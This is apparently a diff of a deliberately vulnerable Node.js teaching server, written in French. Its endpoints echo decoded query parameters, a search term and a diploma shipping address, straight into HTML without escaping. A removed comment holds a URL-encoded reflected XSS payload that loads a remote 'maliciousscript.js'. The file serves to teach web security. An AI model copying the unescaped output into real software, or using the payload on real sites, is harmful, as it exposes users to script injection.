@@ -10,19 +10,16 @@ var path="";
 
 var serveRequest = function(request, response) {
     if ( request.url.startsWith("/search?query=")) {
-	// Try: http://localhost:8080/search?query=%3Cscript%20src%3D%22http%3A%2F%2Fteaching-api.juliengs.ca%2Fmaliciousscript.js%22%3E%3C%2Fscript%3E
-	// Retourner not found
-	var expr = decodeURIComponent(request.url.split("=")[1]);
+	var expr = decodeURIComponent(request.url.split("=")[1]).replaceAll("+", " ");
 	console.log(expr);
 	response.statusCode = 200;
         response.write("<html><body>Aucun resultat trouve pour l'expression: " + expr + "</body></html>");
 	response.end();        
-    } else if ( request.url.startsWith("/etransfer?recipient=") ) {
-	// Retourner not found
+    } else if ( request.url.startsWith("/getdiploma?address=") ) {
 	var expr = decodeURIComponent(request.url.split("=")[1]);
 	console.log(expr);
 	response.statusCode = 200;
-	response.write(expr);
+	response.write("Merci d'avoir commande votre diplome! Ce dernier sera expedie a l'adresse suivante: " + expr);
 	response.end();
     } else if (request.url.startsWith("/searchhistory") ) {
 
